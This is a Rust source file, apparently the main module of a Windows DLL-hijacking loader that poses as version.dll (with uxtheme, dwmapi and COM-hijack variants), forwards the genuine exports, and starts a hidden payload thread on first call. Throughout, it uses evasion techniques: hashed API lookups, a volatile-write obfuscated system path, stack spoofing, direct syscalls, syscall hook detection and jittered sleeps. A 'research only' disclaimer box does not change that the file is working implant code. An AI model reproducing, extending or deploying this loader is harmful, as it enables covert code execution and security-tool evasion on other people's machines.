#![allow(non_snake_case, non_camel_case_types, non_upper_case_globals)]
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Once;
use winapi::ctypes::c_void;

pub(crate) mod config;
pub(crate) mod config_payload;
pub(crate) mod hash;
pub(crate) mod nt;
pub(crate) mod pe;
#[cfg(feature = "proxy_version")]
pub(crate) mod resolver;
pub(crate) mod ssn_resolver;
pub(crate) mod stack_spoof;
pub(crate) mod syscalls;
pub(crate) mod timer_sleep;

#[cfg(any(feature = "proxy_version", feature = "proxy_uxtheme", feature = "proxy_dwmapi"))]
pub(crate) mod fake_imports;
pub(crate) mod threadpool;

pub(crate) mod debug_logger;
pub(crate) mod dualview;
pub(crate) mod obfuscation;
pub(crate) mod payload;
pub(crate) mod codec;
pub(crate) mod utils;

#[cfg(feature = "com_hijack")]
pub(crate) mod com;



#[cfg(any(feature = "proxy_version", feature = "proxy_uxtheme", feature = "proxy_dwmapi"))]
use crate::nt::UNICODE_STRING;

#[cfg(any(feature = "proxy_version", feature = "proxy_uxtheme", feature = "proxy_dwmapi"))]
static REAL_VERSION_DLL: std::sync::atomic::AtomicPtr<c_void> = std::sync::atomic::AtomicPtr::new(std::ptr::null_mut());

#[cfg(any(feature = "proxy_version", feature = "proxy_uxtheme", feature = "proxy_dwmapi"))]
static PROXY_INIT_FAILED: AtomicBool = AtomicBool::new(false);

static INIT: Once = Once::new();

static DLLMAIN_DONE: AtomicBool = AtomicBool::new(false);

pub(crate) static PAYLOAD_READY: AtomicBool = AtomicBool::new(false);

#[cfg(feature = "proxy_version")]
mod proxy_statics {
    use winapi::ctypes::c_void;

    pub(crate) static mut FN_GET_FILE_VERSION_INFO_A: Option<
        unsafe extern "system" fn(*const i8, u32, u32, *mut c_void) -> i32,
    > = None;
    pub(crate) static mut FN_GET_FILE_VERSION_INFO_BY_HANDLE: Option<
        unsafe extern "system" fn(u32, *mut c_void, *mut u32) -> i32,
    > = None;
    pub(crate) static mut FN_GET_FILE_VERSION_INFO_EX_A: Option<
        unsafe extern "system" fn(u32, *const i8, u32, u32, *mut c_void) -> i32,
    > = None;
    pub(crate) static mut FN_GET_FILE_VERSION_INFO_EX_W: Option<
        unsafe extern "system" fn(u32, *const u16, u32, u32, *mut c_void) -> i32,
    > = None;
    pub(crate) static mut FN_GET_FILE_VERSION_INFO_SIZE_A: Option<
        unsafe extern "system" fn(*const i8, *mut u32) -> u32,
    > = None;
    pub(crate) static mut FN_GET_FILE_VERSION_INFO_SIZE_EX_A: Option<
        unsafe extern "system" fn(u32, *const i8, *mut u32) -> u32,
    > = None;
    pub(crate) static mut FN_GET_FILE_VERSION_INFO_SIZE_EX_W: Option<
        unsafe extern "system" fn(u32, *const u16, *mut u32) -> u32,
    > = None;
    pub(crate) static mut FN_GET_FILE_VERSION_INFO_SIZE_W: Option<
        unsafe extern "system" fn(*const u16, *mut u32) -> u32,
    > = None;
    pub(crate) static mut FN_GET_FILE_VERSION_INFO_W: Option<
        unsafe extern "system" fn(*const u16, u32, u32, *mut c_void) -> i32,
    > = None;
    pub(crate) static mut FN_VER_FIND_FILE_A: Option<
        unsafe extern "system" fn(u32, *const i8, *const i8, *const i8, *mut i8, *mut u32, *mut i8, *mut u32) -> u32,
    > = None;
    pub(crate) static mut FN_VER_FIND_FILE_W: Option<
        unsafe extern "system" fn(u32, *const u16, *const u16, *const u16, *mut u16, *mut u32, *mut u16, *mut u32) -> u32,
    > = None;
    pub(crate) static mut FN_VER_INSTALL_FILE_A: Option<
        unsafe extern "system" fn(u32, *const i8, *const i8, *const i8, *const i8, *const i8, *mut i8, *mut u32) -> u32,
    > = None;
    pub(crate) static mut FN_VER_INSTALL_FILE_W: Option<
        unsafe extern "system" fn(u32, *const u16, *const u16, *const u16, *const u16, *const u16, *mut u16, *mut u32) -> u32,
    > = None;
    pub(crate) static mut FN_VER_LANGUAGE_NAME_A: Option<unsafe extern "system" fn(u32, *mut i8, u32) -> u32> = None;
    pub(crate) static mut FN_VER_LANGUAGE_NAME_W: Option<unsafe extern "system" fn(u32, *mut u16, u32) -> u32> = None;
    pub(crate) static mut FN_VER_QUERY_VALUE_A: Option<
        unsafe extern "system" fn(*const c_void, *const i8, *mut *mut c_void, *mut u32) -> i32,
    > = None;
    pub(crate) static mut FN_VER_QUERY_VALUE_W: Option<
        unsafe extern "system" fn(*const c_void, *const u16, *mut *mut c_void, *mut u32) -> i32,
    > = None;
}
#[cfg(feature = "proxy_version")]
use proxy_statics::*;

fn ensure_payload_initialized() {
    INIT.call_once(|| {
        crate::debug_log!("[INIT] Payload initialization started");
        crate::verbose_dbg!("[INIT] ensure_payload_initialized: start");

        
        unsafe {
            type FnMessageBoxA = unsafe extern "system" fn(
                *mut winapi::ctypes::c_void,
                *const i8,
                *const i8,
                u32,
            ) -> i32;

            if let Some(user32) = crate::utils::load_module("user32.dll\0") {
                let h_user32 = user32 as winapi::shared::minwindef::HMODULE;
                if let Some(f) = crate::hash::get_export_by_hash(h_user32, crate::hash::fnv1a_hash(b"MessageBoxA")) {
                    let msg_box: FnMessageBoxA = std::mem::transmute(f);
                    let result = msg_box(
                        std::ptr::null_mut(),
                        "LEGAL DISCLAIMER:\n\nThis software is a Proof-of-Concept designed for EDUCATIONAL and RESEARCH purposes only.\n\nBy clicking 'OK', you certify that:\n1. You are authorized to test this system.\n2. You accept full legal responsibility for any consequences.\n3. You agree the author is not liable for misuse.\n\nClick 'OK' to proceed with execution, or 'Cancel' to terminate immediately.\0".as_ptr() as *const i8,
                        "Security Research Authority Warning\0".as_ptr() as *const i8,
                        0x00000030 | 0x00000001,
                    );
                    
                    if result != 1 {
                        crate::debug_log!("[INIT] User declined disclaimer; execution aborted");
                        return;
                    }
                }
            }
        }
       

        let spoof_ok = crate::syscalls::init_stack_spoofing();
        if !spoof_ok {
            crate::debug_log!("[INIT] Stack spoofing init unavailable; fallback enabled");
        }

        unsafe { crate::timer_sleep::timer_sleep_jitter(2, 8); }

        if !crate::stack_spoof::verify_gadgets_integrity() {
            crate::debug_log!("[INIT] Gadget integrity check did not pass; initialization stopped");
            return;
        }

        unsafe { crate::timer_sleep::timer_sleep_jitter(3, 12); }

        #[cfg(debug_assertions)]
        unsafe {
            use crate::hash::fnv1a_hash;
            let critical_apis: &[(&str, u64)] = &[
                ("NtCreateSection", fnv1a_hash(b"NtCreateSection")),
                ("NtMapViewOfSection", fnv1a_hash(b"NtMapViewOfSection")),
                ("NtUnmapViewOfSection", fnv1a_hash(b"NtUnmapViewOfSection")),
                ("NtClose", fnv1a_hash(b"NtClose")),
            ];
            for &(name, hash) in critical_apis {
                if let Some((_ssn, stub)) = crate::ssn_resolver::resolve_ssn_by_hash(hash) {
                    let hooked = crate::stack_spoof::is_syscall_hooked(stub as usize);
                    if hooked {
                        let info = crate::stack_spoof::detect_hook_at_address(stub as usize);
                        crate::debug_log!(
                            "[HOOK] {} HOOKED: {:?} -> 0x{:X}",
                            name, info.hook_type, info.target_address
                        );
                    } else {
                        crate::debug_log!("[HOOK] {} clean (SSN={})", name, _ssn);
                    }
                }
            }
        }

        unsafe { crate::timer_sleep::timer_sleep_jitter(5, 15); }

        unsafe {
            spawn_payload_thread();
        }

        crate::debug_log!("[INIT] Payload thread started; initialization complete");
    });
}

unsafe fn spawn_payload_thread() {
    let entry_point = match crate::payload::prepare_payload_in_main_thread() {
        Ok(addr) => addr,
        Err(_) => {
            crate::debug_log!("[EXEC] prepare_payload_in_main_thread did not complete");
            return;
        }
    };

    crate::debug_log!("[EXEC] Payload entry resolved");

    let success = crate::payload::execute_payload_direct(entry_point);

    if !success {
        crate::debug_log!("[EXEC] Direct thread creation did not complete");
        return;
    }

    crate::debug_log!("[EXEC] Payload execution started");
}

const DLL_PROCESS_ATTACH: u32 = 1;
const DLL_PROCESS_DETACH: u32 = 0;

#[no_mangle]

pub unsafe extern "system" fn DllMain(
    hinst_dll: *mut c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut c_void,
) -> i32 {
    match fdw_reason {
        DLL_PROCESS_ATTACH => {
            crate::verbose_dbg!("[DLL] PROCESS_ATTACH");

            if let Some(k32_early) = hash::get_module_by_hash(hash::H_KERNEL32) {
                const H_SET_ERR_MODE: u64 = hash::fnv1a_hash(b"SetErrorMode");
                if let Some(f) = hash::get_export_by_hash(k32_early, H_SET_ERR_MODE) {
                    type FnSetErrorMode = unsafe extern "system" fn(u32) -> u32;
                    let set_err: FnSetErrorMode =
                        std::mem::transmute::<winapi::shared::minwindef::FARPROC, FnSetErrorMode>(f);
                    set_err(0x8003);
                }
            }

            #[cfg(any(feature = "proxy_version", feature = "proxy_uxtheme", feature = "proxy_dwmapi"))]
            {
                crate::fake_imports::force_linkage();
                std::hint::black_box(());
            }

            if let Some(k32) = hash::get_module_by_hash(hash::H_KERNEL32) {
                type FnDisable = unsafe extern "system" fn(*mut c_void) -> i32;
                const H_DISABLE: u64 = hash::fnv1a_hash(b"DisableThreadLibraryCalls");
                if let Some(f) = hash::get_export_by_hash(k32, H_DISABLE) {
                    let disable: FnDisable =
                        std::mem::transmute::<winapi::shared::minwindef::FARPROC, FnDisable>(f);
                    let _ = disable(hinst_dll);
                }
            }

            #[cfg(any(feature = "proxy_version", feature = "proxy_uxtheme", feature = "proxy_dwmapi"))]
            {
                let ok = init_real_version_dll();
                if !ok {
                    PROXY_INIT_FAILED.store(true, Ordering::Release);
                    crate::debug_log!("[PROXY] Initialization did not complete");
                } else {
                    PROXY_INIT_FAILED.store(false, Ordering::Release);
                }
            }

            DLLMAIN_DONE.store(true, Ordering::Release);

            crate::verbose_dbg!("[DLL] PROCESS_ATTACH complete");
            1
        }
        DLL_PROCESS_DETACH => {
            crate::verbose_dbg!("[DLL] PROCESS_DETACH");
            1
        }
        _ => 1,
    }
}

#[cfg(any(feature = "proxy_version", feature = "proxy_uxtheme", feature = "proxy_dwmapi"))]
unsafe fn init_real_version_dll() -> bool {
    let mut path = [0u16; 34];
    unsafe {
        let p = path.as_mut_ptr();
        core::ptr::write_volatile(p.add(0),  0x43u16);
        core::ptr::write_volatile(p.add(1),  0x3Au16);
        core::ptr::write_volatile(p.add(2),  0x5Cu16);
        core::ptr::write_volatile(p.add(3),  0x57u16);
        core::ptr::write_volatile(p.add(4),  0x69u16);
        core::ptr::write_volatile(p.add(5),  0x6Eu16);
        core::ptr::write_volatile(p.add(6),  0x64u16);
        core::ptr::write_volatile(p.add(7),  0x6Fu16);
        core::ptr::write_volatile(p.add(8),  0x77u16);
        core::ptr::write_volatile(p.add(9),  0x73u16);
        core::ptr::write_volatile(p.add(10), 0x5Cu16);
        core::ptr::write_volatile(p.add(11), 0x53u16);
        core::ptr::write_volatile(p.add(12), 0x79u16);
        core::ptr::write_volatile(p.add(13), 0x73u16);
        core::ptr::write_volatile(p.add(14), 0x74u16);
        core::ptr::write_volatile(p.add(15), 0x65u16);
        core::ptr::write_volatile(p.add(16), 0x6Du16);
        core::ptr::write_volatile(p.add(17), 0x33u16);
        core::ptr::write_volatile(p.add(18), 0x32u16);
        core::ptr::write_volatile(p.add(19), 0x5Cu16);
        core::ptr::write_volatile(p.add(20), 0x76u16);
        core::ptr::write_volatile(p.add(21), 0x65u16);
        core::ptr::write_volatile(p.add(22), 0x72u16);
        core::ptr::write_volatile(p.add(23), 0x73u16);
        core::ptr::write_volatile(p.add(24), 0x69u16);
        core::ptr::write_volatile(p.add(25), 0x6Fu16);
        core::ptr::write_volatile(p.add(26), 0x6Eu16);
        core::ptr::write_volatile(p.add(27), 0x2Eu16);
        core::ptr::write_volatile(p.add(28), 0x64u16);
        core::ptr::write_volatile(p.add(29), 0x6Cu16);
        core::ptr::write_volatile(p.add(30), 0x6Cu16);
        core::ptr::write_volatile(p.add(31), 0x00u16);
        core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);
    }

    let ldr_load_dll = match crate::resolver::resolve_ldr_load_dll() {
        Some(f) => f,
        None => return false,
    };

    let mut us = UNICODE_STRING {
        Length: 31 * 2,
        MaximumLength: 32 * 2,
        Buffer: path.as_ptr() as *mut u16,
    };

    let mut handle: *mut c_void = std::ptr::null_mut();
    let status = ldr_load_dll(std::ptr::null(), std::ptr::null(), &mut us, &mut handle);

    if crate::nt::nt_success(status) && !handle.is_null() {
        REAL_VERSION_DLL.store(handle, Ordering::Release);
        cache_version_functions(handle);
        return true;
    }

    false
}

#[cfg(feature = "proxy_version")]
unsafe fn cache_version_functions(module: *mut c_void) {
    use winapi::shared::minwindef::HMODULE;
    let m = module as HMODULE;

    macro_rules! cache_fn {
        ($var:ident, $hash:expr, $ty:ty, $name:literal) => {
            {
                const H: u64 = hash::fnv1a_hash($hash);
                match hash::get_export_by_hash(m, H) {
                    Some(f) if !f.is_null() => {
                        $var = Some(std::mem::transmute::<winapi::shared::minwindef::FARPROC, $ty>(f));
                    }
                    _ => {
                        crate::debug_log!("[PROXY] Export resolve unavailable: {}", $name);
                        return;
                    }
                }
            }
        };
    }

    cache_fn!(FN_GET_FILE_VERSION_INFO_A, b"GetFileVersionInfoA",
        unsafe extern "system" fn(*const i8, u32, u32, *mut c_void) -> i32, "GetFileVersionInfoA");
    cache_fn!(FN_GET_FILE_VERSION_INFO_BY_HANDLE, b"GetFileVersionInfoByHandle",
        unsafe extern "system" fn(u32, *mut c_void, *mut u32) -> i32, "GetFileVersionInfoByHandle");
    cache_fn!(FN_GET_FILE_VERSION_INFO_EX_A, b"GetFileVersionInfoExA",
        unsafe extern "system" fn(u32, *const i8, u32, u32, *mut c_void) -> i32, "GetFileVersionInfoExA");
    cache_fn!(FN_GET_FILE_VERSION_INFO_EX_W, b"GetFileVersionInfoExW",
        unsafe extern "system" fn(u32, *const u16, u32, u32, *mut c_void) -> i32, "GetFileVersionInfoExW");
    cache_fn!(FN_GET_FILE_VERSION_INFO_SIZE_A, b"GetFileVersionInfoSizeA",
        unsafe extern "system" fn(*const i8, *mut u32) -> u32, "GetFileVersionInfoSizeA");
    cache_fn!(FN_GET_FILE_VERSION_INFO_SIZE_EX_A, b"GetFileVersionInfoSizeExA",
        unsafe extern "system" fn(u32, *const i8, *mut u32) -> u32, "GetFileVersionInfoSizeExA");
    cache_fn!(FN_GET_FILE_VERSION_INFO_SIZE_EX_W, b"GetFileVersionInfoSizeExW",
        unsafe extern "system" fn(u32, *const u16, *mut u32) -> u32, "GetFileVersionInfoSizeExW");
    cache_fn!(FN_GET_FILE_VERSION_INFO_SIZE_W, b"GetFileVersionInfoSizeW",
        unsafe extern "system" fn(*const u16, *mut u32) -> u32, "GetFileVersionInfoSizeW");
    cache_fn!(FN_GET_FILE_VERSION_INFO_W, b"GetFileVersionInfoW",
        unsafe extern "system" fn(*const u16, u32, u32, *mut c_void) -> i32, "GetFileVersionInfoW");
    cache_fn!(FN_VER_FIND_FILE_A, b"VerFindFileA",
        unsafe extern "system" fn(u32, *const i8, *const i8, *const i8, *mut i8, *mut u32, *mut i8, *mut u32) -> u32, "VerFindFileA");
    cache_fn!(FN_VER_FIND_FILE_W, b"VerFindFileW",
        unsafe extern "system" fn(u32, *const u16, *const u16, *const u16, *mut u16, *mut u32, *mut u16, *mut u32) -> u32, "VerFindFileW");
    cache_fn!(FN_VER_INSTALL_FILE_A, b"VerInstallFileA",
        unsafe extern "system" fn(u32, *const i8, *const i8, *const i8, *const i8, *const i8, *mut i8, *mut u32) -> u32, "VerInstallFileA");
    cache_fn!(FN_VER_INSTALL_FILE_W, b"VerInstallFileW",
        unsafe extern "system" fn(u32, *const u16, *const u16, *const u16, *const u16, *const u16, *mut u16, *mut u32) -> u32, "VerInstallFileW");
    cache_fn!(FN_VER_LANGUAGE_NAME_A, b"VerLanguageNameA",
        unsafe extern "system" fn(u32, *mut i8, u32) -> u32, "VerLanguageNameA");
    cache_fn!(FN_VER_LANGUAGE_NAME_W, b"VerLanguageNameW",
        unsafe extern "system" fn(u32, *mut u16, u32) -> u32, "VerLanguageNameW");
    cache_fn!(FN_VER_QUERY_VALUE_A, b"VerQueryValueA",
        unsafe extern "system" fn(*const c_void, *const i8, *mut *mut c_void, *mut u32) -> i32, "VerQueryValueA");
    cache_fn!(FN_VER_QUERY_VALUE_W, b"VerQueryValueW",
        unsafe extern "system" fn(*const c_void, *const u16, *mut *mut c_void, *mut u32) -> i32, "VerQueryValueW");
}

#[cfg(any(feature = "proxy_version", feature = "proxy_uxtheme", feature = "proxy_dwmapi"))]
#[inline(always)]
fn proxy_ready() -> bool {
    if PROXY_INIT_FAILED.load(Ordering::Acquire) {
        return false;
    }
    if REAL_VERSION_DLL.load(Ordering::Acquire).is_null() {
        return false;
    }
    true
}

#[cfg(any(feature = "proxy_version", feature = "proxy_uxtheme", feature = "proxy_dwmapi"))]
#[inline(always)]
fn proxy_fn<T: Copy>(f: Option<T>) -> Option<T> {
    if let Some(ptr) = f {
        Some(ptr)
    } else {
        None
    }
}

#[cfg(feature = "com_hijack")]
#[no_mangle]
pub unsafe extern "system" fn DllGetClassObject(
    rclsid: *const c_void,
    riid: *const c_void,
    ppv: *mut *mut c_void,
) -> i32 {

    ensure_payload_initialized();
    com::dll_get_class_object(rclsid, riid, ppv)
}

#[cfg(feature = "com_hijack")]
#[no_mangle]
pub unsafe extern "system" fn DllCanUnloadNow() -> i32 {
    com::dll_can_unload_now()
}

#[cfg(feature = "proxy_version")]
#[no_mangle]
pub unsafe extern "system" fn GetFileVersionInfoSizeW(
    filename: *const u16,
    handle: *mut u32,
) -> u32 {
    crate::verbose_dbg!("[EXPORT] GetFileVersionInfoSizeW");
    ensure_payload_initialized();
    if !proxy_ready() {
        if !handle.is_null() {
            *handle = 0;
        }
        return 0;
    }
    let f = match proxy_fn(FN_GET_FILE_VERSION_INFO_SIZE_W) {
        Some(f) => f,
        None => {
            if !handle.is_null() {
                *handle = 0;
            }
            return 0;
        }
    };

    f(filename, handle)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn GetFileVersionInfoW(
    filename: *const u16,
    handle: u32,
    len: u32,
    data: *mut c_void,
) -> i32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_GET_FILE_VERSION_INFO_W) {
        Some(f) => f,
        None => return 0,
    };
    f(filename, handle, len, data)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn GetFileVersionInfoExW(
    flags: u32,
    filename: *const u16,
    handle: u32,
    len: u32,
    data: *mut c_void,
) -> i32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_GET_FILE_VERSION_INFO_EX_W) {
        Some(f) => f,
        None => return 0,
    };
    f(flags, filename, handle, len, data)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn VerQueryValueW(
    block: *const c_void,
    sub_block: *const u16,
    buffer: *mut *mut c_void,
    len: *mut u32,
) -> i32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        if !buffer.is_null() {
            *buffer = std::ptr::null_mut();
        }
        if !len.is_null() {
            *len = 0;
        }
        return 0;
    }
    let f = match proxy_fn(FN_VER_QUERY_VALUE_W) {
        Some(f) => f,
        None => {
            if !buffer.is_null() {
                *buffer = std::ptr::null_mut();
            }
            if !len.is_null() {
                *len = 0;
            }
            return 0;
        }
    };
    f(block, sub_block, buffer, len)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn GetFileVersionInfoSizeExW(
    flags: u32,
    filename: *const u16,
    handle: *mut u32,
) -> u32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        if !handle.is_null() {
            *handle = 0;
        }
        return 0;
    }
    let f = match proxy_fn(FN_GET_FILE_VERSION_INFO_SIZE_EX_W) {
        Some(f) => f,
        None => {
            if !handle.is_null() {
                *handle = 0;
            }
            return 0;
        }
    };
    f(flags, filename, handle)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn GetFileVersionInfoA(
    filename: *const i8,
    handle: u32,
    len: u32,
    data: *mut c_void,
) -> i32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_GET_FILE_VERSION_INFO_A) {
        Some(f) => f,
        None => return 0,
    };
    f(filename, handle, len, data)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn GetFileVersionInfoByHandle(
    handle: u32,
    data: *mut c_void,
    len: *mut u32,
) -> i32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        if !len.is_null() {
            *len = 0;
        }
        return 0;
    }
    let f = match proxy_fn(FN_GET_FILE_VERSION_INFO_BY_HANDLE) {
        Some(f) => f,
        None => {
            if !len.is_null() {
                *len = 0;
            }
            return 0;
        }
    };
    f(handle, data, len)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn GetFileVersionInfoExA(
    flags: u32,
    filename: *const i8,
    handle: u32,
    len: u32,
    data: *mut c_void,
) -> i32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_GET_FILE_VERSION_INFO_EX_A) {
        Some(f) => f,
        None => return 0,
    };
    f(flags, filename, handle, len, data)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn GetFileVersionInfoSizeA(
    filename: *const i8,
    handle: *mut u32,
) -> u32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        if !handle.is_null() {
            *handle = 0;
        }
        return 0;
    }
    let f = match proxy_fn(FN_GET_FILE_VERSION_INFO_SIZE_A) {
        Some(f) => f,
        None => {
            if !handle.is_null() {
                *handle = 0;
            }
            return 0;
        }
    };
    f(filename, handle)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn GetFileVersionInfoSizeExA(
    flags: u32,
    filename: *const i8,
    handle: *mut u32,
) -> u32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        if !handle.is_null() {
            *handle = 0;
        }
        return 0;
    }
    let f = match proxy_fn(FN_GET_FILE_VERSION_INFO_SIZE_EX_A) {
        Some(f) => f,
        None => {
            if !handle.is_null() {
                *handle = 0;
            }
            return 0;
        }
    };
    f(flags, filename, handle)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn VerFindFileA(
    flags: u32,
    filename: *const i8,
    windir: *const i8,
    appdir: *const i8,
    curdir: *mut i8,
    curdir_len: *mut u32,
    destdir: *mut i8,
    destdir_len: *mut u32,
) -> u32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_VER_FIND_FILE_A) {
        Some(f) => f,
        None => return 0,
    };
    f(
        flags,
        filename,
        windir,
        appdir,
        curdir,
        curdir_len,
        destdir,
        destdir_len,
    )
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn VerFindFileW(
    flags: u32,
    filename: *const u16,
    windir: *const u16,
    appdir: *const u16,
    curdir: *mut u16,
    curdir_len: *mut u32,
    destdir: *mut u16,
    destdir_len: *mut u32,
) -> u32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_VER_FIND_FILE_W) {
        Some(f) => f,
        None => return 0,
    };
    f(
        flags,
        filename,
        windir,
        appdir,
        curdir,
        curdir_len,
        destdir,
        destdir_len,
    )
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn VerInstallFileA(
    flags: u32,
    src: *const i8,
    dest: *const i8,
    srcdir: *const i8,
    destdir: *const i8,
    curdir: *const i8,
    tmpfile: *mut i8,
    tmpfile_len: *mut u32,
) -> u32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_VER_INSTALL_FILE_A) {
        Some(f) => f,
        None => return 0,
    };
    f(
        flags,
        src,
        dest,
        srcdir,
        destdir,
        curdir,
        tmpfile,
        tmpfile_len,
    )
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn VerInstallFileW(
    flags: u32,
    src: *const u16,
    dest: *const u16,
    srcdir: *const u16,
    destdir: *const u16,
    curdir: *const u16,
    tmpfile: *mut u16,
    tmpfile_len: *mut u32,
) -> u32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_VER_INSTALL_FILE_W) {
        Some(f) => f,
        None => return 0,
    };
    f(
        flags,
        src,
        dest,
        srcdir,
        destdir,
        curdir,
        tmpfile,
        tmpfile_len,
    )
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn VerLanguageNameA(lang: u32, buf: *mut i8, size: u32) -> u32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_VER_LANGUAGE_NAME_A) {
        Some(f) => f,
        None => return 0,
    };
    f(lang, buf, size)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn VerLanguageNameW(lang: u32, buf: *mut u16, size: u32) -> u32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        return 0;
    }
    let f = match proxy_fn(FN_VER_LANGUAGE_NAME_W) {
        Some(f) => f,
        None => return 0,
    };
    f(lang, buf, size)
}

#[cfg(feature = "proxy_version")]
#[no_mangle]

pub unsafe extern "system" fn VerQueryValueA(
    block: *const c_void,
    sub_block: *const i8,
    buffer: *mut *mut c_void,
    len: *mut u32,
) -> i32 {
    ensure_payload_initialized();
    if !proxy_ready() {
        if !buffer.is_null() {
            *buffer = std::ptr::null_mut();
        }
        if !len.is_null() {
            *len = 0;
        }
        return 0;
    }
    let f = match proxy_fn(FN_VER_QUERY_VALUE_A) {
        Some(f) => f,
        None => {
            if !buffer.is_null() {
                *buffer = std::ptr::null_mut();
            }
            if !len.is_null() {
                *len = 0;
            }
            return 0;
        }
    };
    f(block, sub_block, buffer, len)
}

